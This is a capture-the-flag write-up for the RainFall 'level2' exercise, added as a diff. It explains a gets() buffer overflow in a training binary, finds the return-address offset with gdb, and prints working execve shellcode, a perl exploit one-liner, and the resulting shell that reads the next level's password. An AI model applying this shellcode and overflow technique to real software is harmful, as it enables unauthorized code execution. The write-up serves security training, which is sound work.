@@ -1,0 +1,65 @@
+Here we have a binary "level2"
+
+If we decompile it, we see a small main who is calling "p" function.
+<+6>:	call   0x80484d4 <p>
+
+Ok like previous exercise we have a call to gets function.
+We know gets have a vulnerability to overflow.
+<+25>:	call   0x80483c0 <gets@plt>
+
+But the program have a security and he check the return address to gets
+if is start to 0xb*******.
+<+39>:	and    $0xb0000000,%eax
+<+44>:	cmp    $0xb0000000,%eax
+
+So we can't make a same overflow of exercise 1.
+But p function return adress of strdup with string of gets get.
+
+So we can check this, I put breackpoint at return of main funtion.
+
+(gdb) b * main + 12
+Breakpoint 1 at 0x804854b
+(gdb) r
+Hello World!
+Hello World!
+(gdb) x/s $eax
+0x804a008:	 "Hello World!"
+
+We can see the return adress points to gets string.
+
+Ok, so we can fill the buffer with shellcode and random char and overwrite the eip adress
+with the return adress of strdup.
+
+We need size of buffer, same practise of last exercise. 
+Send a long string: 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+
+0x37634136 = 37 63 41 36 = (in ascii) 7 c A 6, is in little Endian so if i reverse this 6Ac7
+In my long string '6Ac7' Start at the 80th character
+
+Now I need a shellcode for run a shell, I take this:
+http://shell-storm.org/shellcode/files/shellcode-219.php
+
+\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+
+And the return adress of strdup, we display it higher
+(gdb) x/s $eax
+0x804a008:   "Hello World!"
+
+With perl it's look like this:
+
+perl -e 'print("\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" . "A"x(80-55)  . "\x08\xa0\x04\x08");' | ./level2
+
+
+
+
+level2@RainFall:~$ perl -e 'print("\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" . "A"x(80-55)  . "\x08\xa0\x04\x08");' | ./level2
+1�1۰̀Sh/ttyh/dev��1�f�'�̀1�Ph//shh/bin��PS�ᙰ
+                                           ̀AAAAAAAAAAAAAAAAAAA�
+$ whoami
+level3
+$ cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
